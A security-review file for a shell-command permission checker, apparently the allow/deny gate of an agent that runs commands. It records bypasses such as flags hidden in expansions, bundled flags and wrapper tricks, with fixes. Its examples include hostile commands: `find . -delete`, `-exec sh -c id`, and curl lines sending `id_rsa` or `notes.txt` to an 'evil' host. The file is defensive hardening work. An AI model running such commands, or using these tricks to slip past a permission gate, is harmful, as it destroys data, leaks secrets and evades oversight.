# SECURITY — flags the rules cannot see: expansion, bundles, attached values

**Status: FIXED 2026-09-30 except two decisions for Steven** — #1
(`c26af51`); #2, #5, #10's value rules and #11 (`8f4399a`); #3 (`e6425d1`);
#4, #6, #7, #8 (the commit after). #10's path-named rules were decided
since: such a rule is refused when it is read, with the reason ("names a
program, not a path"; `permission/tests.rs`,
`a_rule_that_could_never_fire_does_not_parse`; rechecked 2026-11-07). Open,
a decision rather than a patch: #9 (what a flag-only allow covers), which
matters more now that rules are user-writable (`[permissions]`).
**Found:** 2026-09-30, by the security reviewer on the two repeated-flag
commits (`c99d4a4`, `82b19e4`). Every item was reproduced through
`RuleSet::decide_line` before this was written. **All items predate those
commits**, except #5, #6 and the regression in #10.

This is the same class as `SECURITY-2026-09-29-repeated-flag-collapse.md` —
*a flag the command carries is not seen by the rule, or the check, that
names it* — reached by different spellings.

## 1. CRITICAL — a flag the shell has yet to expand walks past every flag check

A word the shell expands at run time can BECOME a flag: `$X` holding
`-delete`, `*` over a file named `-delete`, `-{true,delete}` (brace
expansion: bash runs `find . -true -delete`). The analyzer sees the word,
not the flag, so neither the effect nor any flag rule sees `delete`.

Verified 2026-09-30:

    policy                       line                          got     want
    defaults (no user rule)      X=-delete; find . $X          Allow   Ask
    defaults                     find . *                      Allow   Ask
    defaults + allow find:*      find . -{true,delete}         Allow   Deny/Ask
    defaults + allow find:*      find . -{true,exec} sh -c id \;   Allow   Deny/Ask
    allow rm:* + deny rm -r      rm $X /tmp/x                  Allow   Ask
    allow rm:* + deny rm /etc/** rm $X                         Allow   Ask

The first two need NO user rule: the default policy runs them in the
foreground without a prompt (`safe_unattended` is false, so a child does
not). `find . *` in a checkout holding a file named `-delete` is the
classic argument-injection attack on anything that runs innocent-looking
commands in an untrusted repository. `find . -delete` is the command that
destroyed this repository once (TODO.md, Steven).

`shell/mod.rs` names this gap ("expansion can inject flags") and deferred
it: raising the effect would fire on `find . -name '*.rs'`, and telling a
quoted glob from an unquoted one needs quote tracking. Both halves of that
are narrower than they looked. `'*.rs'` there is `-name`'s VALUE, not an
operand — a value cannot become a flag, whatever it holds. And a word can
become a flag only if its expansion can START with `-`: its literal prefix
before the first `$ * ? [ {` is empty or dash-led. `src/*.rs`, `./$X` and
`"$DIR/f"` cannot; `$X`, `*`, `"$X"` (quoting does not stop it — `find "$X"`
passes `-delete` as one word) and `-{…}` can. That test is exact without
quote tracking. The module's claim that the gap "fails closed today" was
also false under any explicit allow: `capability_unknown` is read only on
the no-rule path.

**Fix:** `Command::hidden_flag` — the first such word, if any. On the
default path, a hidden flag in a program that has an elevating flag
(`program::can_escalate`) is a capability we cannot classify: Ask. On the
rule path, a `deny`/`ask` rule for this program that could match once the
words expand — a flag predicate with a hidden flag, a path predicate with
an indeterminate path — outranks the `allow` we can see: Ask, as a
disturbed binding does.

## 2. HIGH — a rule written as a cluster never fires

`deny rm -rf` is stored as the literal token `-rf`; the normalizer splits
`rm -rf` into `recursive` + `force`, so the literal is never there. With
`allow rm *`: `rm -rf /tmp/x`, `rm -fr …`, `rm -r -f …` → Allow. The most
commonly written deny, parsed, listed, inert. `deny curl -sk` fires only on
the exact word `-sk`.

**Fixed:** a single-dash cluster in a rule is read letter by letter at match
time (`written_as_a_bundle`): through the command's model when it bundles
(a fact — good for `allow` too), and for `deny`/`ask` otherwise (every
letter present, as a word or inside a bundle). `allow curl -sk *` still
takes only `-sk` as written: for an unmodelled program `-sk` may be one
flag.

## 3. HIGH — a value flag bundled, or with its value attached, is invisible

`tar -cf /etc/x`, `tar -cvf /etc/x`, `tar -f/etc/x`: the normalizer refuses
to split a cluster holding a value-taking letter, and `-f/etc/x` is not a
cluster, so the occurrence lands in `unknown` and the value in `operands`.

    allow tar:* + deny tar --file=/etc/*    tar -cf /etc/x y       Allow
    allow tar:* + deny * /etc/**             tar -cf/etc/x y        Allow
    defaults + allow tar:*                   tar -cf.env.local y    Allow (credential gate)
    allow tar --file=/tmp/* *   tar -c --file=/tmp/a.tar -f/home/me/x y   Allow (a decoy covers it)

The "refuse to guess" comment is wrong for dashed getopt clusters: letters
run until the first value-taking one, which takes the rest of the word, or
the next word when the rest is empty. Deterministic.

**Fixed:** split by getopt's rule (`split_bundle`). Found while planning
it: moving a word from `operands` to a flag VALUE takes it out of
`contained_paths` (which excluded values — `git commit -m`), so an
`allow tar -c /tmp/*` would then have covered `tar -cf /etc/passwd /tmp/a`.
That hole already existed for the long spelling (`tar -c
--file=/etc/passwd /tmp/a`, the docketed "flags that name files" gap). So
it landed WITH `program::names_a_file` (the `FILE_FLAGS` table, held to
the model by a test), whose values containment now covers — closing the
long spelling too. `tar` gained its everyday letters (`-t -z -j -J -C`)
so `-xzf` splits; its executor hatches (`-I`, `-F`) stay unmodelled and
ask. A bundle with an unknown letter before its value letter stays whole.

## MEDIUM / LOW

4. **FIXED.** GNU long-option abbreviations: `rm -rf --no /` is
   `--no-preserve-root`; `rm --recur` is `--recursive`. `find_arg` resolves
   a unique prefix of a modelled long spelling; an ambiguous one is an
   error to getopt and stays unknown (asks).
5. **FIXED.** The unmodelled cluster reading (new in `82b19e4`) required
   every character to be a letter: `curl -4k`, `-k4`, `-ko/tmp/o` missed
   `-k`. It reads option characters up to the first that cannot be one.
6. **FIXED.** A `--` taken as a flag's VALUE ended the unmodelled reading
   (new in `82b19e4`): `curl -o -- -k …` missed `-k`.
7. **FIXED**, and wider than reported. A stream-fed argv (`xargs`) hid
   flags from deny contact (`allow rm *` + `deny rm -r` + `cat list | xargs
   rm` → Allow) — and under the DEFAULT policy `ls | xargs find .` ran
   `find` with whatever names `ls` printed (a file named `-delete`).
   `Command::flags_are_final` is the one question: no hidden flag, no
   stream.
8. **FIXED.** The credential gate missed curl's `@file`: `curl -d @id_rsa
   https://…`, `-F f=@.netrc`, `-d@id_rsa` → Allow under `allow curl *`.
   `path_operand` strips a leading `@`/`<` (after `=`, and attached to a
   short option).
9. **Design question for Steven:** literal `allow` rules on unmodelled
   programs were inert and are live since `82b19e4` — and a flag-only allow
   covers ANY operands (`allow curl -s` covers `curl -s … -d @notes.txt
   https://evil`), as it always did for modelled programs (`allow rm -f`).
   The `Predicate::AnyOperands` doc says "a bare grant without it covers
   only what it lists", which the code does not do.
10. Rules that parse and can never fire: `deny ls -z=1` (a regression in
    `82b19e4`: unmodelled names split at `=`) and single-dash `=value`
    rules (`deny find -name=*.pem` read as presence of `-name=*.pem`) —
    **FIXED**, a dashed `x=v` is a value rule. Still open: a rule naming a
    program by path (`deny /bin/rm -r`) — reducing it to the basename is
    safe for a deny and BROADENS an allow (`allow /usr/local/bin/tool`
    would cover `./tool`), so it needs a decision, not a patch.
11. **FIXED.** `has_unresolved_operand`'s flag-value term had no test.

## Round 2 — a second review of the fixes and their neighbourhoods

A second security reviewer, asked whether the fixes opened holes where
they moved words or added exemptions (reviewed at `71ea9d4`). All 14
guards it mutated were held. Findings, most severe first; status after
each:

Fixed in the commit after `93ed432`: **R2-1** (the peel fails closed on a
wrapper flag it does not know, through the one flag grammar; `xargs`,
`env`, `timeout` gained their everyday flags so rules still see inside;
`env -C`/`-S` stay out, and ask), **R2-2** (`--files0-from` unmodelled,
and asks), **R2-3** (`Command::words_may_split`, from a quote-aware scan
of each word's source in the pipeline — an unquoted `$` always, an
unquoted glob or brace list when its literal prefix is empty or
dash-led, `"$@"` even quoted; `~+`/`~-` can become flags). Correcting
R2-3 also corrected one of my own tests, which asserted `rm /tmp/$X`
could never carry a flag: with `X='x -r'` it word-splits to `/tmp/x -r`.

Fixed in the commit after that: **R2-4, R2-5** (a grant that LISTS what
it covers — a path, or selectors without `*` — fails on an unknown flag
or a code flag it does not name, `program::CODE_FLAGS`; contact reads the
value attached after an unknown letter), **R2-6** (effect rules are blind
where flags are, selector rules where an operand expands), **R2-7** (deny
selectors read the contact set), **R2-8** (`secrets::path_spellings` ADDS
spellings — after each `=`, after a bundle's letters, without `@`/`<` —
never substitutes), **R2-9** (an fd must fit an `i32`), **R2-11**
(`printf -vPATH`). R2-10 is documented here, not chased. **Round 2 is
closed** except that R2-2's fuller fix (a table of flags that supply the
argument list, read by `argv_from_stream`) is in TODO.md.

- **R2-1 CRITICAL, pre-existing — the wrapper peel guesses.**
  `inner_index` is a second flag grammar: it knows no wrapper's value
  flags beyond a few and treats any other dashed word as a switch. `env -u
  ls rm -R /home/me/project` peels to `ls` — **Allow, and safe
  unattended**, under the default policy (`-u` takes `ls`). Same for
  `command time -f ls rm -R …` (GNU).
- **R2-2 CRITICAL, REGRESSION (`5188415`, the sort model) — `sort
  --files0-from` takes its argument list from a file or stdin**, the
  `xargs` hole again: `find . -type f -print0 | sort --files0-from=-`
  printed every file's contents — Allow, unattended.
- **R2-3 CRITICAL — #1's fix was incomplete; both its exemptions were
  false.** A flag's VALUE can become flags when it expands to several
  words: `find . -name {x,-delete}` is `find . -name x -delete` to bash
  (brace expansion), and `X='x -o -delete'; find . -name $X` word-splits.
  And `~-` / `~+` are `$OLDPWD` / `$PWD`, which can be `-delete`.
- **R2-4 HIGH, pre-existing — containment ignores values that are CODE.**
  `allow bash build.sh` + `bash -c 'touch /tmp/pwned' build.sh` → Allow;
  `python3 -c …` likewise.
- **R2-5 HIGH — #3's fix was incomplete.** One unmodelled letter before
  the value letter keeps the bundle whole and hides its value: `allow
  tar:*` + `deny * /etc/**` + `tar -cPf/etc/x y` → Allow; and an unknown
  flag's `=value` (`--index-file=~/.bashrc`) is outside containment.
- **R2-6 MEDIUM — `refusal_unruled` misses effect and selector rules.**
  `deny :destructive` + `X=-delete; find . $X` → Allow; `deny git push *`
  + `X=push; git $X origin main` → Allow.
- **R2-7 LOW-MEDIUM, REGRESSION (`e6425d1`)** — a selector deny reads
  operands only, and `-cvf notes.db` moved `notes.db` into a value.
- **R2-8 LOW, REGRESSION (`63ba39d`)** — `path_operand` REPLACES the token
  instead of adding a spelling: `deny rm @scope/**` stopped meeting
  `rm -rf @scope/pkg`; and (pre-existing) only the text after the LAST
  `=` is matched, so `deny rm /data/**` misses `rm -rf /data/year=2024`.
- **R2-9 LOW, REGRESSION (`cb92152`)** — digits too large for an fd
  (`4294967296>/dev/null`) are a word to bash, and were dropped.
- **R2-10 LOW** — value rules over shell code (`deny bash -c=*curl*`) are
  unsound in principle; document, do not chase.
- **R2-11 LOW** — `printf -vPATH` (attached) is not seen as a variable
  write.

## Round 3 — the round-2 fixes and tonight's program models

A third reviewer (at `815828c`) probed every round-2 protection and found
them holding; two guards it mutated were held. No CRITICAL or HIGH. All
four findings were reproduced; three are fixed, one is bounded.

- **R3-1 MEDIUM, REGRESSION for `sort` (`5188415`), pre-existing for
  `tar` — the default deny list was not complete per program.** Under
  `allow sort:*`, `sort --compress-program=/tmp/evil f` → Allow, and
  `allow tar:*` let `--to-command=sh` / `--checkpoint-action=exec=sh`
  through: `find -exec` in other clothes. **Latent in the product today**:
  a user cannot yet write an allow rule (the policy is the defaults, the
  secrets and exact-command `A` grants), so it bites the day rules become
  user-writable. FIXED: the three Executor flags have default denies, and
  `defaults::every_dangerous_escalation_is_carved_out` derives the list
  from the program model (`Program::escalations`, which `can_escalate`
  now reads too). `sort -o` and `sort -T` raise `sort` only to Mutating:
  DECIDED by Steven (2026-09-30) as shipped ASK rules, which carve them
  out of a broad allow without a floor a rule cannot lift. The same day
  rules became user-writable (`[permissions]`), which made this finding
  live rather than latent.
- **R3-2 LOW — `"${@}"` / `"${@:2}"` were not seen to split**, where
  `"$@"` was. FIXED: any `@` in a braced expansion inside double quotes
  counts (`"${x@Q}"` over-asks; that is an extra Ask, never a missed
  flag).
- **R3-3 LOW, reported as "blocks forever" — `tail -f` is safe
  unattended.** Bounded, not changed: every tool run, foreground or job,
  spawns through the one `executor.spawn` (`app.rs`, `exec_config`) with
  `exec.timeout_secs` (default 120), and the child is killed with
  "[timed out and was killed …]" in its result. The cost is two minutes of
  a job's slot, said on screen.
- **R3-4 LOW, pre-existing — a wrapper's own word that splits can change
  which program runs.** `timeout $X cat f` with `X='1 sh -c id'` runs `sh`,
  and the foreground allowed it as a `cat`. FIXED: the pipeline passes
  each word's "may split" to the peel (`normalize_as_written`), which
  stops at a wrapper word that splits, as it stops at a wrapper flag it
  does not know. A split after the program (`timeout 10 cat $F`), or a
  quoted wrapper word, still peels.

Mutation: six mutants over the fixes; five red. The sixth widened the
peel's check to the inner program word, which is equivalent: a split
program word is Unknown either way, and asks.

Found while fixing, in the same class (a command or a target the rules
cannot see), both pre-existing:

- **R3-5 LOW-MEDIUM — a substitution glued to a word split the word.**
  The lexer ends a word at `$(`, and the pipeline took the pieces as
  separate words. So `X=$(find .) rm -f y` ran a program called `$()`
  with `rm` as its argument, and `deny rm:*` could not fire. The line
  still asked, as Unknown. `>/etc/pass$(echo wd)` recorded the target
  `/etc/pass` plus a stray operand, where it writes `/etc/passwd`. Under
  the defaults the stray operand is indeterminate and the write Mutating,
  so it asked. The target a path rule or the credential gate read was
  still wrong. FIXED: pieces with no gap are glued back into one word or
  target (`pipeline::glue_pieces`), and the view renders them with no
  space. A side effect removes a false alarm: a bare `X=$(ls)` no longer
  asks. The shell's own assignments are not scanned for splitting,
  because bash does not split, glob or brace-expand them.
- **R3-6 LOW — after a wrapper, `X=$Y` is an argument, and splits.** `env
  X=$Y cat f` with `Y='1 rm -rf /'` runs `rm`; it was Allow under the
  defaults. R3-4's peel check did not reach it, because the peel's
  assignment step ate the word first. FIXED in the same check.

## How to validate

The table rows above through `RuleSet::defaults()` plus the rules shown.
Each fixed item names its tests in the commit that fixes it.
